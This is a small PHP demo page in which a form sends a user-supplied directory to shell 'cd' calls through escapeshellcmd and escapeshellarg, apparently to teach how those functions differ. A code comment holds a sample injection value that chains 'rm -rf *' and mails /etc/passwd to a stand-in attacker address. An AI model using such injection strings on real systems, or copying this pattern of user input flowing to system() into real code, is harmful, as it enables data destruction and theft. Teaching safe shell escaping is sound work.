<html>
    <body>
        <form action="<?php echo $_SERVER['SCRIPT_NAME']; ?>" method="post">
            To Directory: <input type="text" name="toDirectory"><br>
            <input type="submit" value="Submit">
        </form>
        <?php
        
        if(isset($_REQUEST['toDirectory'])) {
            $toDirectory = $_REQUEST['toDirectory'];
            system("cd " . escapeshellcmd($toDirectory));
            echo "<hr>";
            system("cd " . escapeshellarg($toDirectory));
            /*
             * $toDirectory = "~; rm -rf *; sendmail hacker@domain.com </etc/passwd";
             * system("cd $toDirectory");                   ---> cd ~; rm -rf *; sendmail hacker@domain.com </etc/passwd
             * system("cd " . escapeshellcmd($toDirectory)) ---> cd \~\; rm -rf \*\; sendmail hacker@domain.com \</etc/passwd
             * system("cd " . escapeshellarg($toDirectory)) ---> cd "~; rm -rf *; sendmail hacker@domain.com </etc/passwd";
             */
        }
        
        ?>
    </body>
</html>
<?php

?>